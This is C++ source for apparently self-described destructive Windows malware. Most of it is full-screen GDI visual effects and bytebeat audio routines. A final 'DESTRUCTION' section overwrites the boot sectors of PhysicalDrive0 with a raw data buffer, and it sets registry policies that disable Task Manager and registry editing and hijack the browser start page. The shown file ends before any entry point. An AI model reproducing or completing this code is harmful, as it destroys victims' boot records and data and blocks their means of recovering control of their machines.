// J100758.269-211525.201.cpp : you get the idea
// Destructive version
// I didnt make it with Comium97 this time due to her being sick with the stomach bug
// by venra (just venra)


#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
//#pragma comment(lib,"msimg32.lib")
#include <math.h>
#include <time.h>
//#define M_PI   3.14159265358979323846264338327950288
#define PI   3.14159265358979323846264338327950288
#define min(a,b) (((a)<(b))?(a):(b))
#define max(a,b) (((a)>(b))?(a):(b))
#define RGBBRUSH 0x1900ac010eul
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#include "Buffer.hpp"

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE unused;
    };
}*PRGBQUAD;

/*typedef union COLOR {
    COLORREF rgb;
    struct {
        BYTE blue;
        BYTE green;
        BYTE red;
    };
} COLOR;*/

DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF GetUnknownColors(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 255, length);
        }
        else {
            return RGB(red, 255, 255);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 255);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(255, length, blue);
            }
            else {
                red = 255; green = 255; blue = 255;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}

COLORREF crSpectrum(int crLength) { // Credits to NotCCR
    double H = fmod(crLength, 360);
    double S = 1.0;
    double V = 0.5;
    double C = (1.0-fabs(2.0*V-1.0)) * S;
    double X = C*(1.0-fabs(fmod(H/60.0, 2.0) - 1.0));
    double M = V - C / 2.0;
    double R, G, B;
    if (H < 60) {
        R = C; G = X, B = 0;
    }
    else if (H < 120) {
        R = X; G = C; B = 0;
    }
    else if (H < 180) {
        R = 0; G = C; B = X;
    }
    else if (H < 240) {
        R = 0; G = X; B = C;
    }
    else if (H < 300) {
        R = X; G = 0; B = C;
    }
    else {
        R = C; G = 0; B = X;
    }
    
    int crRed = static_cast<INT>((R + M) * 255);
    int crGreen = static_cast<INT>((G + M) * 255);
    int crBlue = static_cast<INT>((B + M) * 255);
    return RGB(crRed, crGreen, crBlue);
}

float fclr = 0.0;


DWORD WINAPI rectangle(LPVOID lpParam) 
{
	while (1)
	{
		HDC hdc = GetDC(0);
		POINT cursor;
		GetCursorPos(&cursor);
		HBRUSH brush = CreateSolidBrush(RndRGB()); // By N17Pro3426
		SelectObject(hdc, brush);
		Ellipse(hdc, cursor.x + 50, cursor.y + 50, cursor.x - 50, cursor.y - 50);
        Ellipse(hdc, cursor.x + 45, cursor.y + 45, cursor.x - 45, cursor.y - 45);
        Ellipse(hdc, cursor.x + 40, cursor.y + 40, cursor.x - 40, cursor.y - 40);
        Ellipse(hdc, cursor.x + 35, cursor.y + 35, cursor.x - 35, cursor.y - 35);
        Ellipse(hdc, cursor.x + 30, cursor.y + 30, cursor.x - 30, cursor.y - 30);
        Ellipse(hdc, cursor.x + 25, cursor.y + 25, cursor.x - 25, cursor.y - 25);
        Ellipse(hdc, cursor.x + 20, cursor.y + 20, cursor.x - 20, cursor.y - 20);
        Ellipse(hdc, cursor.x + 15, cursor.y + 15, cursor.x - 15, cursor.y - 15);
        Ellipse(hdc, cursor.x + 10, cursor.y + 10, cursor.x - 10, cursor.y - 10);
        Ellipse(hdc, cursor.x + 5, cursor.y + 5, cursor.x - 5, cursor.y - 5);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(rand()%10);
	}
}

int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

DWORD WINAPI shader1(LPVOID lpvd) 
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((x ^ 9) + (x * 9) * tan((x * y + y) + (x * y + y)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}




DWORD WINAPI melt(LPVOID lpvd) 
{
    HDC hdc;
    int rw;
    while (1) {
        hdc = GetDC(0);
        rw = rand () % w;
        BitBlt(hdc, rw, rand () % 10 - 5, 100, h, hdc, rw, 0, !(rand () % 5) ? SRCCOPY : SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

/*DWORD WINAPI payload2(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(xorshift32() % 7, RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		Ellipse(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Rectangle(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Sleep(20);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
 
    for (int t = 0;; t++)
    {
        const int size = 7000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
 
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(25);
        }
    }
}*/ // shid payloads im using the alt ver

DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)(log(x + (i * 4)) * log2(y + (i * 4)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI pies(LPVOID lpvd) {
    HDC hdc;
    HBRUSH hbsh;
    int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
    int incrementation = 10;
    int x = 10, y = 10;
    while (1) {
        hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        hbsh = CreateSolidBrush(GetUnknownColors(239));
        SelectObject(hdc, hbsh);
        Pie(hdc, x, y, x+100, y+100, rand () % w, rand () % h, 30, 30);
        if (y >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (y == 0) {
            sy = 1;
        }
        if (x == 0) {
            sx = 1;
        }
        DeleteObject(hbsh);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI payload3(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, RGBBRUSH);
		BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, RGBBRUSH);
		Sleep(1);
	}
}


DWORD WINAPI bounce(LPVOID lpParam) // By NotCCR 
{
	/* A thing NotCCR has to say:
	Thank you for using my code. */
    HDC hdc;
    HPEN hp;
    int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
    int incrementation = 10;
    int x = 10, y = 10;
    while (1) {
        hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        hp = CreatePen(PS_SOLID, 15, crSpectrum(fclr));
        SelectObject(hdc, hp);
        AngleArc(hdc, x, y, 90, 150, 0);
        if (y >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (y == 0) {
            sy = 1;
        }
        if (x == 0) {
            sx = 1;
        }
        fclr += M_PI;
        DeleteObject(hp);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Black(LPVOID lpParam) 
{
    HDC desk = GetDC(NULL), mem = CreateCompatibleDC(desk);
    int sw, sh;
    BITMAPINFO bmpi = { 0 };
    PRGBQUAD rgbquad = { 0 };
    sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    bmpi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    HBITMAP bmp = CreateDIBSection(desk, &bmpi, NULL, (void**)&rgbquad, NULL, NULL);
    SelectObject(mem, bmp);
    for (;;) {
        BitBlt(mem, 0, 0, sw, sh, desk, 0, 0, SRCAND);
        for (int c = 0; c < sw * sh; c++) {
            int sx = c % sw, sy = c / sw;
            rgbquad[c].rgb *= sx^sy;
        }
        BitBlt(desk, 0, 0, sw, sh, mem, 0, 0, SRCAND);
        ReleaseDC(NULL, desk);
        Sleep(10);
    }
}

DWORD WINAPI shader3(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = (x+i) ^ (y*i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h + .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, 0x999999);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}

/*DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			INT t = y ^ y | x;
			rgbScreen[i].r *= x+y;
			rgbScreen[i].g *= x+i;
			rgbScreen[i].b *= t+i;
			rgbScreen[i].rgb += (x ^ (1 + y)) + (i * 4);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}*/

DWORD WINAPI melt2(LPVOID lpParam) //original by fr4ctalz
{
	//srand((unsigned int)time(NULL));
	while (1)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 3) - 1;
			int dy = (rand() % 3) - 1;
			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI pie2(LPVOID lpParam) //original by NotCCR but its Pie
{
        HDC hdc;
        HBRUSH hbsh;
        int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
        int incrementation = 10;
        int x = 10, y = 10;
        while (1) {
            hdc = GetDC(0);
            x += incrementation * sx;
            y += incrementation * sy;
            //float fRotationAngle = 0.f, fRotationSpeed = 0.02f;
            hbsh = CreateSolidBrush(GetUnknownColors(360));
            SelectObject(hdc, hbsh);
            HICON icon;
            //int bw = x+100, bh = y+100;
            Pie(hdc, x, y, x+100, y+100, rand () % w, rand () % h, 30, 30);
            DrawIcon(hdc, x, y, icon); DrawIcon(hdc, x+100, y, icon);
            DrawIcon(hdc, x, y+100, icon); DrawIcon(hdc, x+100, y+100, icon);
            if (y >= GetSystemMetrics(1)) {
                sy = -1;
            }
            if (x >= GetSystemMetrics(0)) {
                sx = -1;
            }
            if (y == 0) {
                sy = 1;
            }
            if (x == 0) {
                sx = 1;
            }
            if (rand() % 3 == 0) {
                icon = LoadIconA(NULL, IDI_ERROR);
            }
            else if (rand() % 3 == 1) {
                icon = LoadIconA(NULL, IDI_ASTERISK);
            }
            else if (rand() % 3 == 2) {
                icon = LoadIconA(NULL, IDI_APPLICATION);
            }
            //fRotationAngle += fRotationSpeed;
            DeleteObject(hbsh);
            ReleaseDC(0, hdc);
            Sleep(10);
        }
}

DWORD WINAPI End(LPVOID lpParam)  {
    HDC hdc;
    int sw, sh;
    double angle = 0.0;
    int xadd, yadd; // x angle and y angle
    while (1) {
        hdc = GetDC(NULL);
        sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        xadd = cos(angle) * 100, yadd = sin(angle) * 100;
        BitBlt(hdc, xadd, yadd, sw, sh, hdc, 0, 0, NOTSRCERASE);
        angle += M_PI / 8;
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI textout(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	LPCSTR lpText = "J100758.269-211525.201.exe";
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		SetBkMode(hdc, 0);
		SetTextColor(hdc, GetUnknownColors(239));
		//SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, rand() % 3600, rand() % 3600, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
		SelectObject(hdc, font);
		TextOutA(hdc, top_x, top_y, lpText, strlen(lpText));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(4);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>9|t>>13));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t<<1)^((t<<1)+(t>>7)&t>>12))|t>>(4-(1^7&(t>>19)))|t>>7|t>>9;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t+t>>(t/122));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 8192 ? 7 : 5) * (6 - (3 & t >> 9) + (3 & t >> 9)) >> (3 & -t >> (t & 2050 ? 2 : 11)) | t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 & t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t<<t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

// DESTRUCTION //

void OverwriteBootSectors(void) {
	DWORD dwWriteBytes;
	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDrive == INVALID_HANDLE_VALUE) {
		MessageBoxW(NULL, L"Your entire bloodline will now be executed.", L".", MB_OK|MB_ICONERROR);
		exit(0);
	}
	WriteFile(hDrive, rawData, 32768, &dwWriteBytes, NULL);
	CloseHandle(hDrive);
}

LONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
    HKEY hkResult;
    if (isSet == false) {
        if (isString == false) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
    else if (isSet == true) {
        if (isString == false) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
}

const wchar_t* syst = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM";
void InfectSystem(void) {
	ManageRegW(HKEY_CURRENT_USER, syst, L"DisableTaskMgr", REG_DWORD, 1, NULL, false, false);
	ManageRegW(HKEY_CURRENT_USER, syst, L"DisableRegistrytools", REG_DWORD, 2, NULL, false, false);
	ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Internet Explorer\\Main", L"Start Page", 0, NULL, (LPBYTE)L"https://www.youtube.com/@dozerdaisyproductions", true, true);
}

typedef NTSTATUS(WINAPI* NTRAISEHARDERROR)(NTSTATUS, DWORD, DWORD, PULONG_PTR, DWORD, PDWORD);
